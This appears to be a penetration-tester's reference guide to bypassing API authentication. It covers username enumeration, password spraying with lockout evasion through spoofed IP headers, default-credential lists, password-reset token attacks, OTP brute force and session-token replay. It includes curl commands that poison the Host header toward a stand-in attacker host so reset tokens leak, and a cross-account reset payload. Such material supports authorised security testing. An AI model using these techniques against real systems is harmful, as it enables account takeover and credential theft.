# Credential & Token Auth Bypass

## Username enumeration channels

Enumerate before you spray — a verified user list multiplies hit rate.

| Channel | Probe | Signal |
|---|---|---|
| Login error diff | `POST /v1/login` with valid vs bogus user, wrong pw | "wrong password" vs "no such user"; different status; different length |
| Login timing | same, measure elapsed | bcrypt only runs for existing users → valid users are 50–300 ms slower |
| Password reset | `POST /v1/password-reset {"email":"…"}` | "email sent" vs "account not found" |
| Registration | `POST /v1/register` with an existing email | "already registered" |
| Profile/ID endpoints | `GET /v1/users/alice` unauthenticated | 404 vs 403 distinguishes existence |

`auth_spray.py --mode spray` with one fixed wrong password surfaces
per-user length/timing differentials automatically (`user_stats` +
`enumeration_candidates` in the report).

## Credential stuffing vs password spraying

- **Stuffing**: breached `user:pass` combos, high per-user volume →
  `--pairs combos.txt`. Detects reused passwords.
- **Spraying**: one weak password across all users per round
  (`Winter2024!`, `Password1`, `CompanyName1!`, season+year) →
  `--mode spray --users users.txt --passwords seasons.txt`. Evades per-user
  lockout counters.

Lockout evasion when a counter appears:
- Space rounds beyond the lockout window (`--delay`, `--jitter`).
- Rotate `X-Forwarded-For` / `X-Real-IP` / `True-Client-IP` — many APIs rate
  limit on these spoofable headers instead of the socket IP. Add the header
  to the template and vary it; if the counter resets, that is itself a
  finding (rate limit keyed on client-controlled input).
- Alternate login surfaces: mobile endpoint (`/mobile/v1/login`), legacy
  version (`/v1/` vs `/v2/`), SOAP/XML variant, GraphQL `login` mutation —
  counters are often enforced on only one.

No 429/`Retry-After`/CAPTCHA/lockout across 20+ attempts = **no brute-force
protection**, reportable even with zero hits.

## Default and weak credentials

Try against admin consoles and bundled components behind the API:

```
admin:admin        admin:password     admin:changeme    root:root
administrator:administrator          test:test         api:api
guest:guest        demo:demo          user:user         admin:123456
```

Plus vendor defaults for anything fingerprinted in headers/errors (Grafana
`admin:admin`, RabbitMQ `guest:guest`, Tomcat `tomcat:s3cret`, MongoDB/
Elasticsearch with no auth at all).

## Password reset tokens

1. Request 3–5 resets for an account you control; collect the tokens.
2. Analyze: length (< 16 chars is brute-forceable), charset, shared prefixes,
   monotonic increase (sequential), embedded time (decode base64/hex —
   `base64(email + unix_time)` is common and fully predictable).
3. **Reuse**: complete a reset, then submit the same token again.
4. **Expiry**: use a token hours later.
5. **Invalidation**: request a new token — does the old one still work? A
   victim's mailbox full of valid tokens widens the window.
6. **Cross-account**: submit your token with a victim's email/user ID in the
   same request body — some implementations validate the token but act on
   the supplied identifier:
   `POST /v1/password-reset/confirm {"token":"<yours>","email":"victim@example.com","password":"Pwned123!"}`
7. **Host-header poisoning**: the reset email's link is often built from the
   request's `Host`:
   ```
   curl -sk -X POST https://api.example.com/v1/password-reset \
     -H 'Host: evil.example.net' -d '{"email":"victim@example.com"}'
   curl -sk -X POST https://api.example.com/v1/password-reset \
     -H 'X-Forwarded-Host: evil.example.net' -d '{"email":"victim@example.com"}'
   ```
   If the mail links to `evil.example.net/reset?token=…`, the token leaks to
   you when the victim clicks → account takeover.
8. **Response leakage**: some APIs return the token in the HTTP response to
   the reset request itself. Read the body.

## OTP / 2FA

- **Brute force**: 6 digits = 10^6; at even 20 req/s that is < 14 hours, and
  most OTPs live 5–15 minutes with a keyspace fully coverable if there is no
  attempt cap. Template the verify request with `^PASS^` as the code and run
  `auth_spray.py` with `seq -w 000000 999999`.
- **Rate-limit bypass**: same tricks as login (spoofed IP headers, alternate
  endpoints, re-requesting a fresh OTP to reset the counter).
- **Reuse**: submit the same OTP after a successful verification.
- **Leakage**: the OTP echoed in the send-OTP response body or in a
  verbose error.
- **Step skipping**: after password auth returns a "pre-auth" token, call
  the post-2FA endpoint directly with it (`GET /v1/me`,
  `POST /v1/transfer`) — the 2FA gate may exist only in the client.
- **Response manipulation hint**: if the client decides based on
  `{"verified":false}`, the server may accept the next step regardless —
  test the server, not the client.

## Session / opaque token handling

- **Predictability**: log in 5 times rapidly; diff tokens. Sequential,
  timestamp-derived, or short tokens → forge neighbors. `md5(username)`-
  shaped session IDs are instant takeover.
- **Logout invalidation**: capture token → `POST /v1/logout` → replay token.
  Still valid = finding.
- **Password-change invalidation**: change the password, replay the old
  session token.
- **Expiry enforcement**: if the token advertises a lifetime (docs, `exp`-
  like field, cookie `Max-Age`), replay after expiry. Accepting an expired
  or revoked token is a finding. (If the token is a JWT, enforcement of
  `exp`/signature is `jwt-attacks` territory — hand off.)
- **Client binding**: replay the token from a different IP and User-Agent;
  no reaction means stolen tokens are fully portable.
- **Token in URL**: `?token=`, `?session=`, `?auth=` anywhere (including
  websocket upgrade URLs and download links) → log/referrer exposure,
  finding by itself.
- **Concurrent sessions**: unlimited parallel sessions with no visibility is
  a weakness worth noting alongside a stronger finding.

## Transport & scheme confusion

- **Basic over the API**: `Authorization: Basic $(printf 'admin:admin' | base64)`
  accepted where only bearer/key auth is documented → an extra, usually
  unmonitored and unthrottled, credential surface.
- **Downgrade**: does `http://api.example.com/` serve the API? Does the
  gateway forward credentials over the plaintext leg?
- **Wrong scheme accepted**: `Authorization: Token …`, `Authorization: …`
  (no scheme), duplicate `Authorization` headers (first vs last wins —
  gateway and backend may disagree, enabling gateway-auth bypass).
- **Unauthenticated shadow endpoints** (API9 overlap): the documented route
  enforces auth but `/api/internal/orders`, `/v0/orders`, `/orders.json`,
  or the same path on another port/vhost does not. Sweep every mapped path
  with auth stripped (Step 1 of SKILL.md) across all discovered base paths.
